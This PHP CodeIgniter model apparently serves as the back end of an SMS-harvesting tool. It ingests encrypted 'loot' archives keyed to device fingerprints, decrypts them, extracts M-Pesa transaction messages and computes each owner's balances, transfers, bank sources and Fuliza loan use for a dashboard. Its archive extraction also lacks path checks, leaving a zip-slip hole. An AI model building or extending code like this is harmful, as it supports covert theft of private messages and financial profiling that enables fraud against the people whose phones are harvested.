<?php

namespace App\Models;

use CodeIgniter\Model;
use App\Models\ModCryption;
use ZipArchive;

class ModUploads extends Model
{
    protected $table = "tbl_Loot";
    protected $primaryKey = "loot_Id";
    protected $allowedFields = [
        'loot_Name', 'loot_Device', 'loot_Owner', 'loot_Uuid', 'loot_Created'
    ];

    // SMS pattern configuration with 'sms_' prefix
    protected $smsPatterns = [
        'sms_receive' => "confirmed.you have received ksh",
        'sms_from_mshwari' => "transferred from m-shwari account on",
        'sms_from_ncba' => "from ncba bank on",
        'sms_from_kcb' => "from kcb",
        'sms_from_im_bank' => "from im bank limited- app on",
        'sms_balance_mpesa' => "confirmed. your account balance was",
        'sms_balance_kcb' => "confirmed. your kcb m-pesa",
        'sms_balance_mshwari' => "confirmed . your m-shwari deposit account",
        'sms_reversal' => "confirmed. reversal of transaction",
        'sms_loan_limit' => "confirmed. your loan limit is",
        'sms_sent_to_mpesa' => "sent to",
        'sms_sent_to_lnm' => "paid to",
        'sms_sent_mini' => "confirmed. you have transfered ksh",
        'sms_sent_to_mshwari' => "transferred to m-shwari account on",
        'sms_sent_cancel' => "you have cancelled the transaction",
        'sms_error_failed' => "failed.",
        'sms_error_pin' => "you have entered the wrong pin",
        'sms_error_insufficient' => "insufficient funds in your",
        'sms_error_receiver' => "the number you are trying to pay has not joined the service",
        'sms_error_receiver_org' => "transaction failed, m-pesa cannot complete payment of",
        'sms_withdraw' => "confirmed.on",
        'sms_fuliza_opt_out' => "you have successfully opted out of fuliza m-pesa service.",
        'sms_fuliza_opt_in' => "you have successfully opted into fuliza m-pesa.",
        'sms_fuliza_limit' => "your fuliza m-pesa limit is ksh",
        'sms_fuliza_loan_pay' => "from your m-pesa has been used to partially pay your outstanding fuliza m-pesa",
        'sms_fuliza_mini_statement' => "your fuliza m-pesa mini statement is as follows",
        'sms_fuliza_loan_taken' => "confirmed. fuliza m-pesa amount is",
        'sms_similar_transaction' => "m-pesa is unable to process your request because a similar transaction is currently underway",
        'sms_unknown' => "" // Default catch-all
    ];

    // ============ PUBLIC METHODS ============ //

    public function file_upload(array $data): bool {
        return $this->db->table($this->table)->insert($data);
    }

    public function loot_zip_extract(string $zipFilePath): bool {
        $this->validate_zip_file($zipFilePath);

        $extractPath = WRITEPATH . 'uploads/txt_loot/';
        $this->ensure_directory_exists($extractPath);

        $zip = new ZipArchive();
        if ($zip->open($zipFilePath) !== TRUE) {
            throw new \RuntimeException("Failed to open ZIP file");
        }

        $zip->extractTo($extractPath);
        $zip->close();

        return true;
    }

    public function loot_last_uploaded(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Uuid')
            ->get();

        return $result->getResult()[0]->loot_Uuid ?? null;
    }

    public function loot_info(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_info_all(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_summary(string $loot_uuid): array {
        return $this->db->table('tbl_Loot_Summary')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_parse_sms(
        string $loot_uuid,
        string $loot_owner,
        string $loot_device,
        string $dated
    ): array {
        $result = ['status' => 'error', 'message' => ''];

        try {
            $this->db->transBegin();

            // 1. Validate and get loot file
            $lootFile = $this->validate_and_get_loot_file($loot_uuid);

            // 2. Load and decrypt content
            $decrypted = $this->decrypt_loot_file($lootFile['path']);

            // 3. Parse JSON data
            $smsData = $this->parse_sms_json($decrypted);

            // 4. Process messages
            $processed = $this->process_sms_messages(
                $smsData,
                $loot_uuid,
                $loot_owner,
                $loot_device
            );

            // 5. Save summary
            $this->save_summary_data(
                $processed['counters'],
                $loot_uuid,
                $dated
            );

            $this->db->transCommit();

            return [
                'status' => 'success',
                'processed' => $processed['inserted_count'],
                'summary' => $processed['counters']
            ];

        } catch (\Exception $e) {
            $this->db->transRollback();
            log_message('error', 'SMS Processing Error: ' . $e->getMessage());
            $result['message'] = $e->getMessage();
            return $result;
        }
    }

    public function file_listing(string $loot_owner, string $loot_device): array {
        return $this->db->table($this->table)
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get()
            ->getResult();
    }

    public function device_check_print(array $print_dump): array {
        return $this->db->table('tbl_Devices')
            ->select('device_Uuid')
            ->where($print_dump)
            ->get()
            ->getResult();
    }

    public function get_loot_uuid(string $loot_name): string {
        $result = $this->db->table($this->table)
            ->select('loot_Uuid')
            ->where('loot_Name', $loot_name)
            ->get()
            ->getResult();

        return $result[0]->loot_Uuid ?? '';
    }

    public function get_loot_summary_from_uuids(array $loot_array_uuids): array {
        return $this->db->table('tbl_Loot_Summary')
            ->select('*')
            ->whereIn('loot_Uuid', $loot_array_uuids)
            ->get()
            ->getResult();
    }

    public function device_make_print(array $print_dump): bool {
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }

    /**
     * Finds the date of the absolute last upload
     */
    public function getLastUploadDate(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Created')
            ->get()
            ->getRow();
        return $result->loot_Created ?? null;
    }

    /**
     * Get aggregated metrics for the dashboard within 30 days of last upload
     */
    public function getDashboardMetrics30Days(string $lastDate): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        $stats = [
            'current_balance' => 0,
            'fuliza_balance' => 0,
            'total_sent_30' => 0,
            'total_received_30' => 0,
            'withdrawn_30' => 0,
            'fuliza_taken_30' => 0
        ];

        $smsList = $this->db->table('tbl_Sms')
            ->where('sms_time >=', $thirtyDaysAgo)
            ->where('sms_time <=', $lastDate)
            ->get()
            ->getResult();
        
        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            if ($sms->sms_category === 'Received') {
                $stats['total_received_30'] += $amount;
            } elseif (in_array($sms->sms_category, ['Sent', 'Sent to LNM'])) {
                $stats['total_sent_30'] += $amount;
            } elseif ($sms->sms_category === 'Withdraw') {
                $stats['withdrawn_30'] += $amount;
            } elseif ($sms->sms_category === 'Fuliza Loan Taken') {
                $stats['fuliza_taken_30'] += $amount;
            }

            // Always use the very last message for current balance
            if (strpos($body, 'new m-pesa balance is ksh') !== false) {
                // We keep updating, assuming chronological order, so the last one wins
                $stats['current_balance'] = $this->extractBalance($body);
            }
            if (strpos($body, 'fuliza m-pesa limit is ksh') !== false) {
                $stats['fuliza_balance'] = $this->extractBalance($body);
            }
        }

        return $stats;
    }

    /**
     * Detailed Sent Summary (30 days)
     */
    public function getSentSummary30Days(string $lastDate): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        $data = [
            'paybill' => 0,
            'till' => 0,
            'sent_mobile' => 0,
            'fuliza_deductions' => 0
        ];

        $smsList = $this->db->table('tbl_Sms')
            ->where('sms_time >=', $thirtyDaysAgo)
            ->where('sms_time <=', $lastDate)
            ->get()
            ->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            if ($sms->sms_category === 'Sent to LNM') {
                // Detect if Paybill or Till
                if (strpos($body, 'paybill') !== false) $data['paybill'] += $amount;
                else $data['till'] += $amount;
            } elseif ($sms->sms_category === 'Sent') {
                $data['sent_mobile'] += $amount;
            } elseif ($sms->sms_category === 'Fuliza Loan Paid') {
                $data['fuliza_deductions'] += $amount;
            }
        }
        return $data;
    }

    /**
     * Detailed Received Summary (30 days)
     */
    public function getReceivedSummary30Days(string $lastDate): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        $data = [
            'total' => 0,
            'banks' => 0,
            'mshwari_kcb' => 0
        ];

        $smsList = $this->db->table('tbl_Sms')
            ->where('sms_time >=', $thirtyDaysAgo)
            ->where('sms_time <=', $lastDate)
            ->get()
            ->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            if ($sms->sms_category === 'Received') {
                $data['total'] += $amount;
                if (strpos($body, 'bank') !== false) $data['banks'] += $amount;
            } elseif (in_array($sms->sms_category, ['From M-Shwari Account', 'From KCB'])) {
                $data['mshwari_kcb'] += $amount;
                $data['total'] += $amount;
            }
        }
        return $data;
    }

    /**
     * Fetch recent transactions
     */
    public function getRecentTransactions(int $limit = 10): array {
        return $this->db->table('tbl_Sms')
            ->orderBy('sms_time', 'DESC')
            ->limit($limit)
            ->get()
            ->getResult();
    }

    /**
     * Advanced Filtering
     */
    public function getFilteredTransactions(array $f): array {
        $builder = $this->db->table('tbl_Sms');
        
        if (!empty($f['date_from'])) $builder->where('sms_time >=', $f['date_from']);
        if (!empty($f['date_to'])) $builder->where('sms_time <=', $f['date_to'] . ' 23:59:59');
        if (!empty($f['category'])) $builder->where('sms_category', $f['category']);
        if (!empty($f['search'])) {
            $builder->groupStart()
                ->like('sms_number', $f['search'])
                ->orLike('sms_body', base64_encode($f['search'])) // Rough search for base64
                ->groupEnd();
        }

        $results = $builder->orderBy('sms_time', 'DESC')->get()->getResult();
        
        // Post-process for amount filtering if needed (regex in PHP is easier than SQL here)
        if (!empty($f['min_amount']) || !empty($f['max_amount'])) {
            $results = array_filter($results, function($sms) use ($f) {
                $amt = $this->extractAmount(base64_decode($sms->sms_body));
                if (!empty($f['min_amount']) && $amt < $f['min_amount']) return false;
                if (!empty($f['max_amount']) && $amt > $f['max_amount']) return false;
                return true;
            });
        }

        return $results;
    }

    /**
     * Get data for charts (30 day window)
     */
    public function getAnalyticsData30Days(string $lastDate): array {
        $thirtyDaysAgo = date('Y-m-d', strtotime($lastDate . ' -29 days'));
        
        $labels = [];
        $spending = [];
        $receiving = [];
        
        for ($i = 29; $i >= 0; $i--) {
            $date = date('Y-m-d', strtotime($lastDate . " -$i days"));
            $labels[] = date('d M', strtotime($date));
            
            $daySpending = 0;
            $dayReceiving = 0;
            
            $smsList = $this->db->table('tbl_Sms')
                ->like('sms_time', $date)
                ->get()
                ->getResult();
                
            foreach ($smsList as $sms) {
                $amount = $this->extractAmount(base64_decode($sms->sms_body));
                if ($sms->sms_category === 'Received') $dayReceiving += $amount;
                elseif (in_array($sms->sms_category, ['Sent', 'Sent to LNM'])) $daySpending += $amount;
            }
            
            $spending[] = $daySpending;
            $receiving[] = $dayReceiving;
        }

        // Category breakdown (30 days)
        $categories = [
            'Paybill' => 0, 
            'Till' => 0, 
            'Sent to Mobile' => 0, 
            'Withdrawal' => 0
        ];
        
        $smsList = $this->db->table('tbl_Sms')
            ->where('sms_time >=', date('Y-m-d', strtotime($lastDate . ' -30 days')))
            ->get()
            ->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amt = $this->extractAmount($body);
            if ($sms->sms_category === 'Sent to LNM') {
                if (strpos($body, 'paybill') !== false) $categories['Paybill'] += $amt;
                else $categories['Till'] += $amt;
            } elseif ($sms->sms_category === 'Sent') {
                $categories['Sent to Mobile'] += $amt;
            } elseif ($sms->sms_category === 'Withdraw') {
                $categories['Withdrawal'] += $amt;
            }
        }

        // Fuliza Usage (30 days) - Daily taken vs paid
        $fulizaTaken = [];
        $fulizaPaid = [];
        for ($i = 29; $i >= 0; $i--) {
            $date = date('Y-m-d', strtotime($lastDate . " -$i days"));
            $dayTaken = 0;
            $dayPaid = 0;
            
            $smsList = $this->db->table('tbl_Sms')->like('sms_time', $date)->get()->getResult();
            foreach ($smsList as $sms) {
                $amount = $this->extractAmount(base64_decode($sms->sms_body));
                if ($sms->sms_category === 'Fuliza Loan Taken') $dayTaken += $amount;
                elseif ($sms->sms_category === 'Fuliza Loan Paid') $dayPaid += $amount;
            }
            $fulizaTaken[] = $dayTaken;
            $fulizaPaid[] = $dayPaid;
        }

        return [
            'labels' => $labels,
            'spending' => $spending,
            'receiving' => $receiving,
            'categories' => $categories,
            'fuliza_taken' => $fulizaTaken,
            'fuliza_paid' => $fulizaPaid
        ];
    }

    /**
     * Helper to extract amount from SMS body
     */
    private function extractAmount(string $body): float {
        // Match "Ksh 1,200.00" or "Ksh. 1200"
        if (preg_match('/ksh\s*([0-9,]+\.[0-9]{2}|[0-9,]+)/i', $body, $matches)) {
            return (float) str_replace(',', '', $matches[1]);
        }
        return 0;
    }

    /**
     * Helper to extract balance from SMS body
     */
    private function extractBalance(string $body): float {
        if (preg_match('/balance is ksh\s*([0-9,]+\.[0-9]{2}|[0-9,]+)/i', $body, $matches)) {
            return (float) str_replace(',', '', $matches[1]);
        }
        return 0;
    }

    // ============ PROTECTED METHODS ============ //

    protected function clean_sms_by_trimming_messages(array $smsMessages): array {
        $cleanedMessages = [];
        $transactionTerm = "transaction cost";

        foreach ($smsMessages as $sms) {
            if ($sms->Number != "MPESA") {
                continue;
            }

            $message = strtolower(base64_decode($sms->Body));
            $position = strpos($message, $transactionTerm);

            $cleanedMessages[] = base64_encode(
                $position !== false
                    ? substr($message, 0, $position)
                    : $message
            );
        }

        return $cleanedMessages;
    }

    protected function clean_sms_by_categorizing(array $smsMessages): array {
        $categories = [];
        $counters = array_fill_keys(array_keys($this->smsPatterns), 0);

        foreach ($smsMessages as $message) {
            $decoded = base64_decode($message);
            $category = 'sms_unknown';

            foreach ($this->smsPatterns as $name => $pattern) {
                if (!empty($pattern) && strpos($decoded, $pattern) !== false) {
                    $category = $name;
                    break;
                }
            }

            $counters[$category]++;
            $categories[] = ucwords(str_replace(['sms_', '_'], ['', ' '], $category));
        }

        return [
            'categories' => $categories,
            'counters' => $counters
        ];
    }

    protected function clean_sms_by_returning_column(array $smsMessages, string $columnName): array {
        $columnData = [];
        $property = $columnName === 'Thread Id' ? 'Thread Id' : $columnName;

        foreach ($smsMessages as $sms) {
            if ($sms->Number === "MPESA") {
                $columnData[] = $sms->$property;
            }
        }

        return $columnData;
    }

    protected function validate_zip_file(string $path): void {
        if (!file_exists($path)) {
            throw new \RuntimeException("ZIP file not found");
        }

        if (mime_content_type($path) !== 'application/zip') {
            throw new \RuntimeException("Invalid file type");
        }
    }

    protected function ensure_directory_exists(string $path): void {
        if (!is_dir($path)) {
            mkdir($path, 0755, true);
        }
    }

    protected function validate_and_get_loot_file(string $uuid): array {
        $query = $this->db->table($this->table)
            ->select('loot_Name')
            ->where('loot_Uuid', $uuid)
            ->get();

        if ($query->getNumRows() === 0) {
            throw new \RuntimeException("Loot record not found");
        }

        $fileName = $query->getRow()->loot_Name;
        $filePath = WRITEPATH . "uploads/txt_loot/" . $fileName;

        if (!file_exists($filePath)) {
            throw new \RuntimeException("Loot file not found");
        }

        return [
            'name' => $fileName,
            'path' => $filePath
        ];
    }

    protected function decrypt_loot_file(string $path): string {
        $modCryption = new ModCryption();
        $content = file_get_contents($path);
        $decrypted = $modCryption->decode_content($content);

        if (empty($decrypted)) {
            throw new \RuntimeException("Failed to decrypt file");
        }

        return $decrypted;
    }

    protected function parse_sms_json(string $data): array {
        $transformations = [
            '-------(//)--------' => '',
            "\n" => '****',
            '****"' => '"'
        ];

        $normalized = str_replace(
            array_keys($transformations),
            array_values($transformations),
            $data
        );

        $json = json_decode('[' . substr($normalized, 0, -2) . '}]');

        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new \RuntimeException("JSON parse error: " . json_last_error_msg());
        }

        return $json;
    }

    protected function process_sms_messages(
        array $smsData,
        string $uuid,
        string $owner,
        string $device
    ): array {
        $cleaned = $this->clean_sms_by_trimming_messages($smsData);
        $categorized = $this->clean_sms_by_categorizing($cleaned);

        $batch = [];
        $columns = ['Date', 'Type', 'Number', 'Seen', 'ID', 'Thread Id'];

        foreach ($smsData as $index => $sms) {
            if ($sms->Number != "MPESA") continue;

            $batch[] = [
                'sms_type' => $sms->Type,
                'sms_number' => $sms->Number,
                'sms_thread_id' => $sms->{'Thread Id'},
                'sms_time' => $sms->Date,
                'sms_category' => $categorized['categories'][$index] ?? 'sms_unknown',
                'sms_seen' => $sms->Seen,
                'sms__id' => $sms->ID,
                'sms_body' => $cleaned[$index] ?? '',
                'sms_loot_source' => $uuid,
                'sms_owner' => $owner,
                'sms_device' => $device
            ];
        }

        $inserted = 0;
        foreach (array_chunk($batch, 100) as $chunk) {
            $inserted += $this->db->table('tbl_Sms')->insertBatch($chunk)
                ? count($chunk) : 0;
        }

        return [
            'inserted_count' => $inserted,
            'counters' => $categorized['counters']
        ];
    }

    protected function save_summary_data(array $counters, string $uuid, string $date): bool {
        $mapping = [
            'sms_receive' => 'info_Get_from_MPESA',
            'sms_from_mshwari' => 'info_Get_from_Mshwari',
            'sms_from_ncba' => 'info_Get_from_NCBA',
            'sms_from_kcb' => 'info_Get_from_KCB',
            'sms_from_im_bank' => 'info_Get_from_IM',
            'sms_reversal' => 'info_Get_from_Reversal',
            'sms_balance_mpesa' => 'info_Get_Bal_MPESA',
            'sms_balance_kcb' => 'info_Get_Bal_KCB',
            'sms_balance_mshwari' => 'info_Get_Bal_Mshwari',
            'sms_loan_limit' => 'info_Loan_Limit',
            'sms_sent_to_mpesa' => 'info_Sent_to_MPESA',
            'sms_sent_to_lnm' => 'info_Sent_to_LNM',
            'sms_sent_mini' => 'info_Sent_Mini',
            'sms_sent_to_mshwari' => 'info_Sent_to_Mshwari',
            'sms_sent_cancel' => 'info_Sent_Cancel',
            'sms_error_failed' => 'info_Error_Failed',
            'sms_error_pin' => 'info_Error_Pin',
            'sms_error_insufficient' => 'info_Error_Less',
            'sms_error_receiver' => 'info_Error_Receiver',
            'sms_error_receiver_org' => 'info_Error_Receiver_Org',
            'sms_withdraw' => 'info_Withdraw',
            'sms_fuliza_opt_out' => 'info_Fuliza_Opt_Out',
            'sms_fuliza_opt_in' => 'info_Fuliza_Opt_In',
            'sms_fuliza_limit' => 'info_Fuliza_Limit',
            'sms_fuliza_loan_pay' => 'info_Fuliza_Loan_Paid',
            'sms_fuliza_mini_statement' => 'info_Fuliza_Mini_Statement',
            'sms_fuliza_loan_taken' => 'info_Fuliza_Loan_Taken',
            'sms_similar_transaction' => 'info_Similar_Transaction',
            'sms_unknown' => 'info_Unknown'
        ];

        $summary = ['loot_Uuid' => $uuid, 'loot_Created' => $date];

        foreach ($mapping as $pattern => $field) {
            $summary[$field] = $counters[$pattern] ?? 0;
        }

        $summary['info_All'] = array_sum($counters);

        return $this->db->table('tbl_Loot_Summary')->insert($summary);
    }
}